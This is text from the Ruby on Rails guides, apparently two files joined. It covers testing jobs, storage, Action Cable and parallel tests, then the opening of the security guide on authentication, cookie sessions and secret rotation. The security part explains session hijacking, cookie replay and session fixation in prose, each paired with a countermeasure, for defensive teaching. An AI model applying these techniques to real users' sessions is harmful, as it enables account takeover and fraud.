Here is a test you could write for a billing job:

```ruby
require "test_helper"

class BillingJobTest < ActiveJob::TestCase
  test "account is charged" do
    perform_enqueued_jobs do
      BillingJob.perform_later(account, product)
    end
    assert account.reload.charged_for?(product)
  end
end
```

The default queue adapter for tests will not perform jobs until
[`perform_enqueued_jobs`][] is called. Additionally, it will clear all jobs
before each test is run so that tests do not interfere with each other.

The test uses `perform_enqueued_jobs` and [`perform_later`][] instead of
[`perform_now`][] so that if retries are configured, retry failures are caught
by the test instead of being re-enqueued and ignored.

[`perform_enqueued_jobs`]:
    https://api.rubyonrails.org/classes/ActiveJob/TestHelper.html#method-i-perform_enqueued_jobs
[`perform_later`]:
    https://api.rubyonrails.org/classes/ActiveJob/Enqueuing/ClassMethods.html#method-i-perform_later
[`perform_now`]:
    https://api.rubyonrails.org/classes/ActiveJob/Execution/ClassMethods.html#method-i-perform_now

### Testing Jobs in Context

It's good practice to test that jobs are correctly enqueued, for example, by a
controller action. The [`ActiveJob::TestHelper`][] module provides several
methods that can help with this, such as [`assert_enqueued_with`][].

Here is an example that tests an account model method:

```ruby
require "test_helper"

class AccountTest < ActiveSupport::TestCase
  include ActiveJob::TestHelper

  test "#charge_for enqueues billing job" do
    assert_enqueued_with(job: BillingJob) do
      account.charge_for(product)
    end

    assert_not account.reload.charged_for?(product)

    perform_enqueued_jobs

    assert account.reload.charged_for?(product)
  end
end
```

[`ActiveJob::TestHelper`]:
    https://api.rubyonrails.org/classes/ActiveJob/TestHelper.html
[`assert_enqueued_with`]:
    https://api.rubyonrails.org/classes/ActiveJob/TestHelper.html#method-i-assert_enqueued_with

### Testing that Exceptions are Raised

Testing that your job raises an exception in certain cases can be tricky,
especially when you have retries configured. The `perform_enqueued_jobs` helper
fails any test where a job raises an exception, so to have the test succeed when
the exception is raised you have to call the job's `perform` method directly.

```ruby
require "test_helper"

class BillingJobTest < ActiveJob::TestCase
  test "does not charge accounts with insufficient funds" do
    assert_raises(InsufficientFundsError) do
      BillingJob.new(empty_account, product).perform
    end
    assert_not account.reload.charged_for?(product)
  end
end
```

This method is not recommended in general, as it circumvents some parts of the
framework, such as argument serialization.

Testing Active Storage
----------------------

There is a [`file_fixture_upload`][] helper method to test uploading a file in an integration or controller test, for example:

```ruby#5
class SignupController < ActionDispatch::IntegrationTest
  test "user can sign up" do
    post signup_path, params: {
      email: "me@example.com",
      profile_photo: file_fixture_upload("my-photo.png", "image/png")
    }

    user = User.order(:created_at).last
    assert user.profile_photo.attached?
  end
end
```

[`file_fixture_upload`]: https://api.rubyonrails.org/classes/ActionDispatch/TestProcess/FixtureFile.html#method-i-file_fixture_upload

### Discarding Files Created During Tests

In general, database transactions are rolled back to clean up test data. While
entries in the Active Storage related tables are removed, files attached during
tests are not automatically deleted. Here is how to manually clean up orphaned
files from integration tests and system tests.

#### Integration Tests

To clean up files uploaded during Integration Tests, you use a `teardown` callback.

```ruby
class ActionDispatch::IntegrationTest
  def after_teardown
    super
    FileUtils.rm_rf(ActiveStorage::Blob.service.root)
  end
end
```

If you're using [parallel tests][] and the Disk service, you can configure
each process to use its own folder for Active Storage. This way, the `teardown`
callback will only delete files from the relevant process' tests.

```ruby
class ActionDispatch::IntegrationTest
  parallelize_setup do |i|
    ActiveStorage::Blob.service.root = "#{ActiveStorage::Blob.service.root}-#{i}"
  end
end
```

If your tests verify the deletion of a model with attachments and you're
using Active Job, you will need to set your test environment to use the inline
queue adapter so the purge job is executed immediately rather than at an unknown time
in the future.

```ruby
config.active_job.queue_adapter = :inline
```

[parallel tests]: testing.html#parallel-testing

#### System Tests

In order to clear these files, you use a `after_teardown` callback. Doing it
there ensures that all connections created during the test are complete and you
won't receive an error from Active Storage saying it can't find a file.

```ruby
class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  # ...
  def after_teardown
    super
    FileUtils.rm_rf(ActiveStorage::Blob.service.root)
  end
  # ...
end
```

### Adding Attachments to Fixtures

You can add attachments to your existing [fixtures][]. First, you'll want to create a separate storage service:

```yml
# config/storage.yml

test_fixtures:
  service: Disk
  root: <%= Rails.root.join("tmp/storage_fixtures") %>
```

This tells Active Storage where to "upload" fixture files to, so it should be a
temporary directory. By making it a different directory to your regular `test`
service, you can separate fixture files from files uploaded during a test.

Next, create fixture files for the Active Storage classes:

```yml
# test/fixtures/active_storage/attachments.yml
user_one_profile_photo:
  name: user_one
  record: user_one (User)
  blob: user_one_profile_photo_blob
```

```yml
# test/fixtures/active_storage/blobs.yml
user_one_profile_photo_blob: <%= ActiveStorage::FixtureSet.blob filename: "user_one.png", service_name: "test_fixtures" %>
```

Then put a file in your fixtures directory (the default path is
`test/fixtures/files`) with the corresponding filename. See the
[`ActiveStorage::FixtureSet`][] docs for more information.

Once everything is set up, you'll be able to access attachments in your tests:

```ruby
class UserTest < ActiveSupport::TestCase
  def test_profile_photo
    profile_photo = users(:user_one).profile_photo

    assert profile_photo.attached?
    assert_not_nil profile_photo.download
    assert_equal 1000, profile_photo.byte_size
  end
end
```

#### Cleaning up Fixtures

While files uploaded in tests are cleaned up [at the end of each
test](#discarding-files-created-during-tests), you only need to clean up fixture
files once: when all your tests complete.

If you're using parallel tests, call `parallelize_teardown`:

```ruby
class ActiveSupport::TestCase
  # ...
  parallelize_teardown do |i|
    FileUtils.rm_rf(ActiveStorage::Blob.services.fetch(:test_fixtures).root)
  end
  # ...
end
```

If you're not running parallel tests, use `Minitest.after_run` or the equivalent
for your test framework (e.g. `after(:suite)` for RSpec):

```ruby
# test_helper.rb
Minitest.after_run do
  FileUtils.rm_rf(ActiveStorage::Blob.services.fetch(:test_fixtures).root)
end
```

[fixtures]: testing.html#fixtures
[`ActiveStorage::FixtureSet`]: https://api.rubyonrails.org/classes/ActiveStorage/FixtureSet.html

### Configuring services

You can use the `config/storage/test.yml` file to configure services to be used
in test environment. This is useful when the `service` option is used:

```ruby
class User < ApplicationRecord
  has_one_attached :avatar, service: :s3
end
```

Without configuring a test `s3` service in `config/storage/test.yml`, the `s3` service configured in `config/storage.yml` is used - even when running tests.

The default configuration would be used and files would be uploaded to the service provider configured in `config/storage.yml`.

In this case, you can add `config/storage/test.yml` and use Disk service for a service named `s3` to prevent sending requests to S3.

```yaml
test:
  service: Disk
  root: <%= Rails.root.join("tmp/storage") %>

s3:
  service: Disk
  root: <%= Rails.root.join("tmp/storage") %>
```

Testing Action Cable
--------------------

Since Action Cable is used at different levels inside your application, you'll
need to test both the channels, connection classes themselves, and that other
entities broadcast correct messages.

### Connection Test Case

By default, when you generate a new Rails application with Action Cable, a test
for the base connection class (`ApplicationCable::Connection`) is generated as
well under `test/channels/application_cable` directory.

Connection tests aim to check whether a connection's identifiers get assigned
properly or that any improper connection requests are rejected. Here is an
example:

```ruby
class ApplicationCable::ConnectionTest < ActionCable::Connection::TestCase
  test "connects with params" do
    # Simulate a connection opening by calling the `connect` method
    connect params: { user_id: 42 }

    # You can access the Connection object via `connection` in tests
    assert_equal connection.user_id, "42"
  end

  test "rejects connection without params" do
    # Use `assert_reject_connection` matcher to verify that
    # connection is rejected
    assert_reject_connection { connect }
  end
end
```

You can also specify request cookies the same way you do in integration tests:

```ruby
test "connects with cookies" do
  cookies.signed[:user_id] = "42"

  connect

  assert_equal connection.user_id, "42"
end
```

See the API documentation for
[`ActionCable::Connection::TestCase`](https://api.rubyonrails.org/classes/ActionCable/Connection/TestCase.html)
for more information.

### Channel Test Case

By default, when you generate a channel, an associated test will be generated as
well under the `test/channels` directory. Here's an example test with a chat
channel:

```ruby
require "test_helper"

class ChatChannelTest < ActionCable::Channel::TestCase
  test "subscribes and stream for room" do
    # Simulate a subscription creation by calling `subscribe`
    subscribe room: "15"

    # You can access the Channel object via `subscription` in tests
    assert subscription.confirmed?
    assert_has_stream "chat_15"
  end
end
```

This test is pretty simple and only asserts that the channel subscribes the
connection to a particular stream.

You can also specify the underlying connection identifiers. Here's an example
test with a web notifications channel:

```ruby
require "test_helper"

class WebNotificationsChannelTest < ActionCable::Channel::TestCase
  test "subscribes and stream for user" do
    stub_connection current_user: users(:john)

    subscribe

    assert_has_stream_for users(:john)
  end
end
```

See the API documentation for
[`ActionCable::Channel::TestCase`](https://api.rubyonrails.org/classes/ActionCable/Channel/TestCase.html)
for more information.

### Custom Assertions And Testing Broadcasts Inside Other Components

Action Cable ships with a bunch of custom assertions that can be used to lessen
the verbosity of tests. For a full list of available assertions, see the API
documentation for
[`ActionCable::TestHelper`](https://api.rubyonrails.org/classes/ActionCable/TestHelper.html).

It's a good practice to ensure that the correct message has been broadcasted
inside other components (e.g. inside your controllers). This is precisely where
the custom assertions provided by Action Cable are pretty useful. For instance,
within a model:

```ruby
require "test_helper"

class ProductTest < ActionCable::TestCase
  test "broadcast status after charge" do
    assert_broadcast_on("products:#{product.id}", type: "charged") do
      product.charge(account)
    end
  end
end
```

If you want to test the broadcasting made with `Channel.broadcast_to`, you
should use `Channel.broadcasting_for` to generate an underlying stream name:

```ruby
# app/jobs/chat_relay_job.rb
class ChatRelayJob < ApplicationJob
  def perform(room, message)
    ChatChannel.broadcast_to room, text: message
  end
end
```

```ruby
# test/jobs/chat_relay_job_test.rb
require "test_helper"

class ChatRelayJobTest < ActiveJob::TestCase
  include ActionCable::TestHelper

  test "broadcast message to room" do
    room = rooms(:all)

    assert_broadcast_on(ChatChannel.broadcasting_for(room), text: "Hi!") do
      ChatRelayJob.perform_now(room, "Hi!")
    end
  end
end
```

Running tests in Continuous Integration (CI)
--------------------------------------------

Continuous Integration (CI) is a development practice where changes are
frequently integrated into the main codebase, and as such, are automatically
tested before merge.

To run all tests in a CI environment, there's just one command you need:

```bash
$ bin/rails test
```

If you are using [System Tests](#system-testing), `bin/rails test` will not run
them, since they can be slow. To also run them, add another CI step that runs
`bin/rails test:system`, or change your first step to `bin/rails test:all`,
which runs all tests including system tests.

Parallel Testing
----------------

Running tests in parallel reduces the time it takes your entire test suite to
run. While forking processes is the default method, threading is supported as
well.

### Parallel Testing with Processes

The default parallelization method is to fork processes using Ruby's DRb system.
The processes are forked based on the number of workers provided. The default
number is the actual core count on the machine, but can be changed by the number
passed to the `parallelize` method.

To enable parallelization add the following to your `test_helper.rb`:

```ruby
class ActiveSupport::TestCase
  parallelize(workers: 2)
end
```

The number of workers passed is the number of times the process will be forked.
You may want to parallelize your local test suite differently from your CI, so
an environment variable is provided to be able to easily change the number of
workers a test run should use:

```bash
$ PARALLEL_WORKERS=15 bin/rails test
```

#### Reproducing Flaky Parallel Tests

Whether using processes or threads, tests are distributed to workers in
round-robin order, so given the same `--seed` value and worker count, each
worker runs the same sequence of tests. This makes flaky tests caused by
parallel test interdependence easier to reproduce: re-run with the same seed
and worker count to get the same distribution.

This deterministic assignment can make test runtime uneven when one worker
happens to get most of the slow tests. Enable `work_stealing` to allow idle
workers to steal tests from busy workers, improving load balance at the cost
of less reproducible test distribution:

```ruby
class ActiveSupport::TestCase
  parallelize(workers: :number_of_processors, work_stealing: true)
end
```

When parallelizing tests, Active Record automatically handles creating a
database and loading the schema into the database for each process. The
databases will be suffixed with the number corresponding to the worker. For
example, if you have 2 workers the tests will create `test-database-0` and
`test-database-1` respectively.

If the number of workers passed is 1 or fewer the processes will not be forked
and the tests will not be parallelized and they will use the original
`test-database` database.

Two hooks are provided, one runs when the process is forked, and one runs before
the forked process is closed. These can be useful if your app uses multiple
databases or performs other tasks that depend on the number of workers.

The `parallelize_setup` method is called right after the processes are forked.
The `parallelize_teardown` method is called right before the processes are
closed.

```ruby
class ActiveSupport::TestCase
  parallelize_setup do |worker|
    # setup databases
  end

  parallelize_teardown do |worker|
    # cleanup databases
  end

  parallelize(workers: :number_of_processors)
end
```

These methods are not needed or available when using parallel testing with
threads.

### Parallel Testing with Threads

If you prefer using threads or are using JRuby, a threaded parallelization
option is provided. The threaded parallelizer is backed by minitest's
`Parallel::Executor`.

To change the parallelization method to use threads over forks put the following
in your `test_helper.rb`:

```ruby
class ActiveSupport::TestCase
  parallelize(workers: :number_of_processors, with: :threads)
end
```

Rails applications generated from JRuby or TruffleRuby will automatically
include the `with: :threads` option.

NOTE: As in the section above, you can also use the environment variable
`PARALLEL_WORKERS` in this context, to change the number of workers your test
run should use.

### Testing Parallel Transactions

When you want to test code that runs parallel database transactions in threads,
those can block each other because they are already nested under the implicit
test transaction.

To workaround this, you can disable transactions in a test case class by setting
`self.use_transactional_tests = false`:

```ruby
class WorkerTest < ActiveSupport::TestCase
  self.use_transactional_tests = false

  test "parallel transactions" do
    # start some threads that create transactions
  end
end
```

NOTE: With disabled transactional tests, you have to clean up any data tests
create as changes are not automatically rolled back after the test completes.

### Threshold to Parallelize tests

Running tests in parallel adds an overhead in terms of database setup and
fixture loading. Because of this, Rails won't parallelize executions that
involve fewer than 50 tests.

You can configure this threshold in your `test.rb`:

```ruby
config.active_support.test_parallelization_threshold = 100
```

And also when setting up parallelization at the test case level:

```ruby
class ActiveSupport::TestCase
  parallelize threshold: 100
end
```

NOTE: Setting the `PARALLEL_WORKERS` environment variable will bypass the
threshold check, enabling parallelization regardless of test count.

Testing Eager Loading
---------------------

Normally, applications do not eager load in the `development` or `test`
environments to speed things up. But they do in the `production` environment.

If some file in the project cannot be loaded for whatever reason, it is
important to detect it before deploying to production.

### Continuous Integration

If your project has CI in place, eager loading in CI is an easy way to ensure
the application eager loads.

CIs typically set an environment variable to indicate the test suite is running
there. For example, it could be `CI`:

```ruby
# config/environments/test.rb
config.eager_load = ENV["CI"].present?
```

Starting with Rails 7, newly generated applications are configured that way by
default.

If your project does not have continuous integration, you can still eager load
in the test suite by calling `Rails.application.eager_load!`:

```ruby
require "test_helper"

class ZeitwerkComplianceTest < ActiveSupport::TestCase
  test "eager loads all files without errors" do
    assert_nothing_raised { Rails.application.eager_load! }
  end
end
```

Additional Testing Resources
----------------------------

### Errors

In system tests, integration tests and functional controller tests, Rails will
attempt to rescue from errors raised and respond with HTML error pages by
default. This behavior can be controlled by the
[`config.action_dispatch.show_exceptions`](/configuring.html#config-action-dispatch-show-exceptions)
configuration.

### Testing Time-Dependent Code

Rails provides built-in helper methods that enable you to assert that your
time-sensitive code works as expected.

The following example uses the [`travel_to`][travel_to] helper:

```ruby
# Given a user is eligible for gifting a month after they register.
user = User.create(name: "Gaurish", activation_date: Date.new(2004, 10, 24))
assert_not user.applicable_for_gifting?

travel_to Date.new(2004, 11, 24) do
  # Inside the `travel_to` block `Date.current` is stubbed
  assert_equal Date.new(2004, 10, 24), user.activation_date
  assert user.applicable_for_gifting?
end

# The change was visible only inside the `travel_to` block.
assert_equal Date.new(2004, 10, 24), user.activation_date
```

Please see [`ActiveSupport::Testing::TimeHelpers`][time_helpers_api] API
reference for more information about the available time helpers.

[travel_to]:
    https://api.rubyonrails.org/classes/ActiveSupport/Testing/TimeHelpers.html#method-i-travel_to
[time_helpers_api]:
    https://api.rubyonrails.org/classes/ActiveSupport/Testing/TimeHelpers.html


<!-- ===== guides/source/security.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Securing Rails Applications
===========================

This guide describes common security problems in web applications and how to avoid them with Rails.

After reading this guide, you will know:

* How to use the built-in authentication generator.
* All countermeasures _that are highlighted_.
* The concept of sessions in Rails, what to put in there and popular attack methods.
* How just visiting a site can be a security problem (with CSRF).
* What you have to pay attention to when working with files or providing an administration interface.
* How to manage users: Logging in and out and attack methods on all layers.
* And the most popular injection attack methods.

--------------------------------------------------------------------------------

Introduction
------------

Web application frameworks are made to help developers build web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Ruby on Rails has some clever helper methods, for example against SQL injection, so this is hardly a problem.

In general there is no such thing as plug-n-play security. Security depends on the people using the framework, and sometimes on the development method. And it depends on all layers of a web application environment: The back-end storage, the web server, and the web application itself (and possibly other layers or applications).

The Gartner Group, however, estimates that 75% of attacks are at the web application layer, and found out "that out of 300 audited sites, 97% are vulnerable to attack". This is because web applications are relatively easy to attack, as they are simple to understand and manipulate, even by the lay person.

The threats against web applications include user account hijacking, bypass of access control, reading or modifying sensitive data, or presenting fraudulent content. Or an attacker might be able to install a Trojan horse program or unsolicited e-mail sending software, aim at financial enrichment, or cause brand name damage by modifying company resources. In order to prevent attacks, minimize their impact and remove points of attack, first of all, you have to fully understand the attack methods in order to find the correct countermeasures. That is what this guide aims at.

In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs, and make updating and security checks a habit (check the [Additional Resources](#additional-resources) chapter). It is done manually because that's how you find the nasty logical security problems.

Authentication
--------------

Authentication is often one of the first features implemented in a web
application. It serves as the foundation for securing user data and is part of
most modern web applications.

Starting with version 8.0, Rails comes with a default authentication generator,
which provides a solid starting point for securing your application by only
allowing access to verified users.

The authentication generator adds all of the relevant models, controllers,
views, routes, and migrations needed for basic authentication and password reset
functionality.

To use this feature in your application, you can run `bin/rails generate
authentication`. Here are all of the files the generator modifies and new files
it adds:

```bash
$ bin/rails generate authentication
      invoke  erb
      create    app/views/passwords/new.html.erb
      create    app/views/passwords/edit.html.erb
      create    app/views/sessions/new.html.erb
      create  app/models/session.rb
      create  app/models/user.rb
      create  app/models/current.rb
      create  app/controllers/sessions_controller.rb
      create  app/controllers/concerns/authentication.rb
      create  app/controllers/passwords_controller.rb
      create  app/mailers/passwords_mailer.rb
      create  app/views/passwords_mailer/reset.html.erb
      create  app/views/passwords_mailer/reset.text.erb
      create  test/mailers/previews/passwords_mailer_preview.rb
        gsub  app/controllers/application_controller.rb
       route  resources :passwords, param: :token
       route  resource :session
        gsub  Gemfile
      bundle  install --quiet
    generate  migration CreateUsers email_address:string!:uniq password_digest:string! --force
       rails  generate migration CreateUsers email_address:string!:uniq password_digest:string! --force
      invoke  active_record
      create    db/migrate/20241010215312_create_users.rb
    generate  migration CreateSessions user:references ip_address:string user_agent:string --force
       rails  generate migration CreateSessions user:references ip_address:string user_agent:string --force
      invoke  active_record
      create    db/migrate/20241010215314_create_sessions.rb
```

As shown above, the authentication generator modifies the `Gemfile` to add the
[bcrypt](https://github.com/bcrypt-ruby/bcrypt-ruby/) gem. The generator uses
the `bcrypt` gem to create a hash of the password, which is then stored in the
database (instead of the plain-text password). As this process is not
reversible, there's no way to go from the hash back to the password. The hashing
algorithm is deterministic though, so the stored password is able to be compared
with the hash of the user-inputted password during authentication.

The generator adds two migration files for creating `user` and `session` tables.
Next step is to run the migrations:

```bash
$ bin/rails db:migrate
```

Then, if you visit `/session/new` in your browser (you will see this route has
been added in `routes.rb`), you'll see a form that accepts an email and a
password with "sign in" button. This form routes to the `SessionsController`
which was added by the generator. If you provide an email/password for a user
that exists in the database, you will be able to successfully authenticate with
those credentials and log in to the application.

NOTE: After running the Authentication generator, you do need to implement your
own *sign up flow* and add the necessary views, routes, and controller actions.
There is no code generated that creates new `user` records and allows users to
"sign up" in the first place. This is something you'll need to wire up based on
the requirements of your application.

Here is a list of modified files:

```bash
On branch main
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
  modified:   Gemfile
  modified:   Gemfile.lock
  modified:   app/controllers/application_controller.rb
  modified:   config/routes.rb

Untracked files:
  (use "git add <file>..." to include in what will be committed)
  app/controllers/concerns/authentication.rb
  app/controllers/passwords_controller.rb
  app/controllers/sessions_controller.rb
  app/mailers/passwords_mailer.rb
  app/models/current.rb
  app/models/session.rb
  app/models/user.rb
  app/views/passwords/
  app/views/passwords_mailer/
  app/views/sessions/
  db/migrate/
  db/schema.rb
  test/mailers/previews/
```

### Reset Password

The authentication generator also adds reset password functionality. You can see
a "forgot password?" link on the "sign in" page. Clicking that link navigates to
the `/passwords/new` path and routes to the passwords controller. The `new`
method of the `PasswordsController` class runs through the flow for sending a
password reset email.

The link is valid for 15 minutes by default, but this can be configured with
`has_secure_password`.

The mailers for *reset password* are also set up by the generator at
`app/mailers/password_mailer.rb` and render the following email to send to the
user:

```html+erb
# app/views/passwords_mailer/reset.html.erb
<p>
  You can reset your password within the next 15 minutes on
  <%= link_to "this password reset page", edit_password_url(@user.password_reset_token) %>.
</p>
```

### Implementation Details

This section covers some of the implementation details around the authentication
flow added by the authentication generator: The `has_secure_password` method,
the `authenticate_by` method, and the `Authentication` concern.

#### `has_secure_password`

The
[`has_secure_password`](https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password)
method is added to the `user` model and takes care of storing a hashed password
using the `bcrypt` algorithm:

```ruby
class User < ApplicationRecord
  has_secure_password
  has_many :sessions, dependent: :destroy

  normalizes :email_address, with: -> e { e.strip.downcase }
end
```

NOTE: `has_secure_password` adds the following validations automatically:<br/><br/>
- Password must be present on creation<br/>
- Password length should be less than or equal to 72 bytes<br/>
- Confirmation of password (using a XXX_confirmation attribute)<br/><br/>
However it doesn't validate the minimum length or the complexity of the password, you need to define validation for those yourself.

#### `authenticate_by`

The
[`authenticate_by`](https://api.rubyonrails.org/classes/ActiveRecord/SecurePassword/ClassMethods.html)
method is used in the `SessionsController` while creating a new session to
validate that the credentials provided by the user match the credentials stored
in the database (e.g. password) for that user:

```ruby
class SessionsController < ApplicationController
  def create
    if user = User.authenticate_by(params.permit(:email_address, :password))
      start_new_session_for user
      redirect_to after_authentication_url
    else
      redirect_to new_session_url, alert: "Try another email address or password."
    end
  end

  # ...
end
```

If the credentials are valid, a new `Session` is created for that user.

#### Session Management

The core functionality around session management is implemented in the
`Authentication` controller concern, which is included by the
`ApplicationController` in your application. You can explore details of the
[authentication
concern](https://github.com/rails/rails/blob/main/railties/lib/rails/generators/rails/authentication/templates/app/controllers/concerns/authentication.rb.tt)
in the source code.

One method to note in the `Authentication` concern is `authenticated?`, a helper
method available in view templates. You can use this method to conditionally
display links/buttons depending on whether a user is currently authenticated.
For example:

```html+erb
<% if authenticated? %>
  <%= button_to "Sign Out", session_path, method: :delete  %>
<% else %>
  <%= link_to "Sign In", new_session_path %>
<% end %>
```

TIP: You can find all of the details for the Authentication generator in the
Rails source code. You are encouraged to explore the implementation details and
not treat authentication as a black box.

With the authentication generator configured as above, your application is ready
for a more secure user authentication and password recovery process in just a
few steps.

Sessions
--------

This chapter describes some particular attacks related to sessions, and security measures to protect your session data.

### What are Sessions?

INFO: Sessions enable the application to maintain user-specific state, while users interact with the application. For example, sessions allow users to authenticate once and remain signed in for future requests.

Most applications need to keep track of state for users that interact with the application. This could be the contents of a shopping basket, or the user id of the currently logged in user. This kind of user-specific state can be stored in the session.

Rails provides a session object for each user that accesses the application. If the user already has an active session, Rails uses the existing session. Otherwise a new session is created.

NOTE: Read more about sessions and how to use them in [Action Controller Overview Guide](action_controller_overview.html#session).

### Session Hijacking

WARNING: _Stealing a user's session ID lets an attacker use the web application in the victim's name._

Many web applications have an authentication system: a user provides a username and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session ID in the cookie identifies the session.

Hence, the cookie serves as temporary authentication for the web application. Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:

* Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN, it is especially easy to listen to the traffic of all connected clients. For the web application builder this means to _provide a secure connection over SSL_. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:

    ```ruby
    config.force_ssl = true
    ```

* Most people don't clear out the cookies after working at a public terminal. So if the last user didn't log out of a web application, you would be able to use it as this user. Provide the user with a _log-out button_ in the web application, and _make it prominent_.

* Many cross-site scripting (XSS) exploits aim at obtaining the user's cookie. You'll read [more about XSS](#cross-site-scripting-xss) later.

* Instead of stealing a cookie unknown to the attacker, they fix a user's session identifier (in the cookie) known to them. Read more about this so-called session fixation later.

### Session Storage

NOTE: Rails uses `ActionDispatch::Session::CookieStore` as the default session storage.

TIP: Learn more about other session storages in [Action Controller Overview Guide](action_controller_overview.html#session).

Rails `CookieStore` saves the session hash in a cookie on the client-side.
The server retrieves the session hash from the cookie and
eliminates the need for a session ID. That will greatly increase the
speed of the application, but it is a controversial storage option and
you have to think about the security implications and storage
limitations of it:

* Cookies have a size limit of 4 kB. Use cookies only for data which is relevant for the session.

* Cookies are stored on the client-side. The client may preserve cookie contents even for expired cookies. The client may copy cookies to other machines. Avoid storing sensitive data in cookies.

* Cookies are temporary by nature. The server can set expiration time for the cookie, but the client may delete the cookie and its contents before that. Persist all data that is of more permanent nature on the server side.

* Session cookies do not invalidate themselves and can be maliciously
  reused. It may be a good idea to have your application invalidate old
  session cookies using a stored timestamp.

* Rails encrypts cookies by default. The client cannot read or edit the contents of the cookie, without breaking encryption. If you take appropriate care of your secrets, you can consider your cookies to be generally secured.

The `CookieStore` uses the
[encrypted](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted)
cookie jar to provide a secure, encrypted location to store session
data. Cookie-based sessions thus provide both integrity as well as
confidentiality to their contents. The encryption key, as well as the
verification key used for
[signed](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed)
cookies, is derived from the `secret_key_base` configuration value.

TIP: Secrets must be long and random. Use `bin/rails secret` to get new unique secrets.

INFO: Learn more about [managing credentials later in this guide](security.html#custom-credentials)

It is also important to use different salt values for encrypted and
signed cookies. Using the same value for different salt configuration
values may lead to the same derived key being used for different
security features which in turn may weaken the strength of the key.

In test and development applications get a `secret_key_base` derived from the app name. Other environments must use a random key present in `config/credentials.yml.enc`, shown here in its decrypted state:

```yaml
secret_key_base: 492f...
```

WARNING: If your application's secrets may have been exposed, strongly consider changing them. Note that changing
`secret_key_base` without rotating the old value will expire currently active sessions and require all users to log in
again. In addition to session data: encrypted cookies, signed cookies, and Active Storage files may also be affected.

### Rotating the `secret_key_base`

You can rotate your application's `secret_key_base` without immediately
invalidating messages generated with the old secret. First, replace
`secret_key_base` with a new random value and make the old value available
separately, for example as `old_secret_key_base` in your credentials. Then add
the old value as a fallback before any message verifiers are created:

```ruby
# config/application.rb
config.before_initialize do |app|
  app.message_verifiers.rotate(
    secret_key_base: app.credentials.old_secret_key_base
  )
end
```

New messages are generated using the new `secret_key_base`, while application
message verifiers can still verify messages generated with the old one. This
includes framework features backed by `Rails.application.message_verifiers`,
such as signed IDs and Active Storage.

Cookies use a separate rotation configuration. To preserve existing signed and
encrypted cookies, derive their old secrets from the old `secret_key_base` and
register them in an initializer:

```ruby
# config/initializers/cookie_rotator.rb
Rails.application.config.after_initialize do |app|
  old_secret_key_base = app.credentials.old_secret_key_base
  old_key_generator = app.key_generator(old_secret_key_base)
  action_dispatch = app.config.action_dispatch

  old_signed_secret = old_key_generator.generate_key(
    action_dispatch.signed_cookie_salt
  )
  old_encrypted_secret = old_key_generator.generate_key(
    action_dispatch.authenticated_encrypted_cookie_salt,
    ActiveSupport::MessageEncryptor.key_len(action_dispatch.encrypted_cookie_cipher)
  )

  action_dispatch.cookies_rotations.tap do |cookies|
    cookies.rotate :signed, old_signed_secret
    cookies.rotate :encrypted, old_encrypted_secret
  end
end
```

After enough time has passed for old messages and cookies to expire or be
rewritten, remove the rotations and delete `old_secret_key_base`.

WARNING: Do not retain an exposed secret as a fallback: if the old value may be compromised, replace
it immediately and allow existing messages and cookies to become invalid.

### Rotating Encrypted and Signed Cookies Configurations

Rotation is ideal for changing cookie configurations and ensuring old cookies
aren't immediately invalid. Your users then have a chance to visit your site,
get their cookie read with an old configuration and have it rewritten with the
new change. The rotation can then be removed once you're comfortable enough
users have had their chance to get their cookies upgraded.

It's possible to rotate the ciphers and digests used for encrypted and signed cookies.

For instance to change the digest used for signed cookies from SHA1 to SHA256,
you would first assign the new configuration value:

```ruby
Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
```

Now add a rotation for the old SHA1 digest so existing cookies are
seamlessly upgraded to the new SHA256 digest.

```ruby
Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end
```

Then any written signed cookies will be digested with SHA256. Old cookies
that were written with SHA1 can still be read, and if accessed will be written
with the new digest so they're upgraded and won't be invalid when you remove the
rotation.

Once users with SHA1 digested signed cookies should no longer have a chance to
have their cookies rewritten, remove the rotation.

While you can set up as many rotations as you'd like it's not common to have many
rotations going at any one time.

For more details on key rotation with encrypted and signed messages as
well as the various options the `rotate` method accepts, please refer to
the
[MessageEncryptor API](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html)
and
[MessageVerifier API](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html)
documentation.

### Replay Attacks for CookieStore Sessions

TIP: _Another sort of attack you have to be aware of when using `CookieStore` is the replay attack._

It works like this:

* A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we'll do this for demonstration purposes).
* The user buys something.
* The new adjusted credit value is stored in the session.
* The user takes the cookie from the first step (which they previously copied) and replaces the current cookie in the browser.
* The user has their original credit back.

Including a nonce (a random value) in the session solves replay attacks. A nonce is valid only once, and the server has to keep track of all the valid nonces. It gets even more complicated if you have several application servers. Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).

The best _solution against it is not to store this kind of data in a session, but in the database_. In this case store the credit in the database and the `logged_in_user_id` in the session.

### Session Fixation

NOTE: _Apart from stealing a user's session ID, the attacker may fix a session ID known to them. This is called session fixation._

![Session fixation](images/security/session_fixation.png)

This attack focuses on fixing a user's session ID known to the attacker, and forcing the user's browser into using this ID. It is therefore not necessary for the attacker to steal the session ID afterwards. Here is how this attack works:

* The attacker creates a valid session ID: They load the login page of the web application where they want to fix the session, and take the session ID in the cookie from the response (see numbers 1 and 2 in the image).
